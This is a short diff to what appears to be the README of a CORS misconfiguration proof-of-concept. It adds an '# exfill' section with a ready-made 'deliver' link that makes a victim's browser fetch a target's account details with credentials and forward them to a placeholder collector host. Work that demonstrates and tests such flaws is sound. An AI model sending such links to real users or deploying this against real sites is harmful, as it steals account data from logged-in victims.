@@ -10,7 +10,9 @@ Access-Control-Allow-Origin: null
 
 Access-Control-Allow-Credentials: true
 
+# exfill
 Now you can send a single “deliver” link such as:
+
 https://ythone.github.io/cors_poc/deliver.html?target=https://TARGET/accountDetails&creds=1&exfil=https://your-collector.example/collect
 
 https://ythone.github.io/cors_poc/deliver.html
@@ -18,7 +20,7 @@ https://ythone.github.io/cors_poc/deliver.html
   &creds=1
   &exfil=https://your-collector.example/collect
 
-
+# local test
 Run locally:
 
 npm i
